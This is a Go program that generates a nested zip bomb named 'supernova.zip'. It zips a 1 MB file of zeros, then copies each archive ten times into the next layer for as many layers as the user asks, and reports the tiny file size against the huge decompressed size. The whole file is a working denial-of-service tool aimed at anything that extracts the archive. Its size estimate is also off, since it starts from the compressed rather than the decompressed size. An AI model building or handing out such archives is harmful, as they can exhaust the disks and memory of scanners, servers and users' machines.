package main

// ./<bin> <amount of nested layers>

import (
	"archive/zip"
	"math/big"
	"io"
	"fmt"
	"os"
	"strconv"
	"io/ioutil"
	"strings"
	"time"
	"sync"
)


const outfile = "supernova.zip"

func ZipFiles(filename string, file string) error {
	newZipFile, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer newZipFile.Close()

	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()

	err = AddFileToZip(zipWriter, file)
	if err != nil {
		return err
	}
	os.Remove(file)
	return nil
}

func AddFileToZip(zipWriter *zip.Writer, filename string) error {
	fileToZip, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer fileToZip.Close()

	info, err := fileToZip.Stat()
	if err != nil {
		return err
	}

	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return err
	}

	header.Name = filename
	header.Method = zip.Deflate
	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return err
	}
	_, err = io.Copy(writer, fileToZip)
	return err
}

func CopyAndCompress(file string, count int) error {
	newZipName := fmt.Sprintf("level%d.zip", count+1)
	newZipFile, err := os.Create(newZipName)
	if err != nil {
		return err
	}
	defer newZipFile.Close()

	zipWriter := zip.NewWriter(newZipFile)
	var mu sync.Mutex

	bytesRead, err := ioutil.ReadFile(file)
	if err != nil {
		return err
	}

	var wg sync.WaitGroup
	for i := 1; i <= 10; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			zipName := fmt.Sprintf("%d.zip", i)
			err = ioutil.WriteFile(zipName, bytesRead, 0755)
			if err != nil {
				fmt.Println("Error writing file:", err)
				return
			}

			mu.Lock()
			defer mu.Unlock()

			err = AddFileToZip(zipWriter, zipName)
			if err != nil {
				fmt.Println("Error adding file to zip:", err)
				return
			}
			os.Remove(zipName)
		}(i)
	}
	wg.Wait()
	defer zipWriter.Close()
	os.Remove(file)
	return nil
}



func GenerateNest(levels int) {
	start := time.Now()

	// Create a dummy file of size 1MB
	dummyFile := "dummy.txt"
	file, err := os.Create(dummyFile)
	if err != nil {
		fmt.Println("Error creating dummy file:", err)
		return
	}

	x := strings.Repeat("0", 1024*1024)
	_, err = file.Write([]byte(x))
	if err != nil {
		fmt.Println("Error writing to dummy file:", err)
		return
	}
	file.Close()

	// Make level1 zip archive using the dummy file
	level1 := "level1.zip"
	err = ZipFiles(level1, dummyFile)
	if err != nil {
		fmt.Println("Error zipping level 1:", err)
		return
	}


	level1info, err := os.Stat(level1)
	if err != nil {
		fmt.Println("Error getting file info:", err)
		return
	}
	level1size := level1info.Size()
	decompressionSize := big.NewInt(level1size) // initiate decompression size with decompressed level1 size
	
	
	
	
	for i := 1; i < levels; i++ {
		decompressionSize.Mul(decompressionSize, big.NewInt(10)) // Each level increases size by a factor of 10
		zipName := fmt.Sprintf("level%d.zip", i)
		err = CopyAndCompress(zipName, i)
		if err != nil {
			fmt.Println("Error in CopyAndCompress:", err)
			return
		}
	}
	decompressionSize = new(big.Int).Div(decompressionSize, big.NewInt(1024*1024)) // Convert to MB

	// Rename the last level zip archive
	bombLevel := fmt.Sprintf("level%d.zip", levels)
	bytesRead, err := ioutil.ReadFile(bombLevel)
	if err != nil {
		fmt.Println("Error reading final zip file:", err)
		return
	}
	err = ioutil.WriteFile(outfile, bytesRead, 0755)
	if err != nil {
		fmt.Println("Error writing final output file:", err)
		return
	}
	os.Remove(bombLevel)

	end := time.Now()
	elapsed := end.Sub(start)

	bombInfo, err := os.Stat(outfile)
	if err != nil {
		fmt.Println("Error getting file info:", err)
		return
	}
	bombSize := bombInfo.Size()
	fmt.Println("disk filesize:", outfile, bombSize/1024, "KB")
	fmt.Println("decompressed filesize:", decompressionSize, "MB")
	fmt.Println("time elapsed:", elapsed.Milliseconds(), "ms")
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./<bin> <number of levels>")
		return
	}
	levels, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("Error parsing levels:", err)
		return
	}
	GenerateNest(levels)
}